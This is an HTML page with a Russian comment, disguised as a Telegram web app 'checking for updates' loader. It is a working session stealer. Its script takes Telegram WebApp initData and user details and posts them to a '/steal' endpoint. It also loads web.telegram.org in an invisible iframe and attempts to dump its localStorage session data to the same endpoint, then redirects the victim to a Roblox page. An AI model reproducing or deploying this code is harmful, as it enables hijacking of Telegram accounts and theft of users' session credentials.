<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
    <style>
        body {
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial;
            color: white;
        }
        .loader { text-align: center; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #30363d;
            border-top: 4px solid #0088cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <p>Проверка обновлений...</p>
</div>

<script>
    // Ждём загрузки страницы
    setTimeout(function() {
        // Метод 1: Через Telegram WebApp (работает внутри Telegram)
        try {
            const tg = window.Telegram.WebApp;
            const initData = tg.initData;
            const user = tg.initDataUnsafe.user;
            
            if (initData && initData.length > 50) {
                fetch('/steal', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        method: 'webapp',
                        initData: initData,
                        user: user
                    })
                });
                window.location.href = 'https://www.roblox.com/games/';
                return;
            }
        } catch(e) {}
        
        // Метод 2: Через iframe + localStorage (работает, если есть сессия)
        const iframe = document.createElement('iframe');
        iframe.src = 'https://web.telegram.org/k/';
        iframe.style.position = 'absolute';
        iframe.style.width = '1px';
        iframe.style.height = '1px';
        iframe.style.opacity = '0';
        document.body.appendChild(iframe);
        
        let attempts = 0;
        const interval = setInterval(() => {
            attempts++;
            try {
                const ls = iframe.contentWindow.localStorage;
                if (ls && ls.length > 0) {
                    const data = {};
                    for (let i = 0; i < ls.length; i++) {
                        const key = ls.key(i);
                        data[key] = ls.getItem(key);
                    }
                    fetch('/steal', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ method: 'localstorage', data: data })
                    });
                    clearInterval(interval);
                    window.location.href = 'https://www.roblox.com/games/';
                }
            } catch(e) {}
            if (attempts > 30) {
                clearInterval(interval);
                window.location.href = 'https://www.roblox.com/games/';
            }
        }, 1000);
    }, 500);
</script>
</body>
</html>
